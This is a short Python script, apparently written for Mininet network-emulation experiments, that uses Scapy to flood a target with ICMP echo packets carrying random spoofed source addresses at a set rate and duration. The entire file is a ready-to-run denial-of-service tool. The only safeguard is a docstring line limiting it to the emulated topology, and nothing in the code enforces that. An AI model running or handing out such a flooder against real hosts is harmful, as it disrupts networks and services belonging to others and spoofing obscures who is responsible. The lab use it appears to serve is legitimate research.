"""ICMP echo flood via Scapy — spoofed source IPs. Requires root.
Only point this at hosts inside the emulated Mininet topology.
"""
import argparse
import time

from scapy.all import ICMP, IP, RandIP, send


def run(target, rate=500, duration=10, spoof_subnet="10.0.0.0/8", verbose=True):
    interval = 1.0 / rate
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        pkt = IP(src=RandIP(spoof_subnet), dst=target) / ICMP()
        send(pkt, verbose=0)
        sent += 1
        time.sleep(interval)
    if verbose:
        print(f"icmp_flood: sent {sent} packets to {target}")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True)
    parser.add_argument("--rate", type=float, default=500)
    parser.add_argument("--duration", type=float, default=10)
    args = parser.parse_args()
    run(args.target, args.rate, args.duration)


if __name__ == "__main__":
    main()
